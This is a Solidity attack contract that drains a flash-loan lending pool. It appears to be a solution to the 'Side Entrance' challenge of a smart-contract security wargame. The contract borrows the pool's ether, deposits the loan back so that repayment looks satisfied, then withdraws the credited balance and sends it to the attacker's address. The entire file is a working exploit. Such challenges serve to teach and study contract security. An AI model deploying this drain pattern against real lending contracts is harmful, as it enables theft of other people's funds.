

import "../side-entrance/SideEntranceLenderPool.sol";

contract AttackSideEntrance is IFlashLoanEtherReceiver {

    address payable _owner;
    SideEntranceLenderPool _victim;

    constructor(address owner, address victim) {
        _owner = payable(owner);
        _victim = SideEntranceLenderPool(victim);
    }

    function attack(uint256 amount) public {
        require(msg.sender == _owner, "Only owner can attack");
        _victim.flashLoan(amount);
        _victim.withdraw();
    }

    function execute() public payable {
        _victim.deposit{value: address(this).balance}();
    }

    receive() external payable {
        _owner.transfer(address(this).balance);
    }

}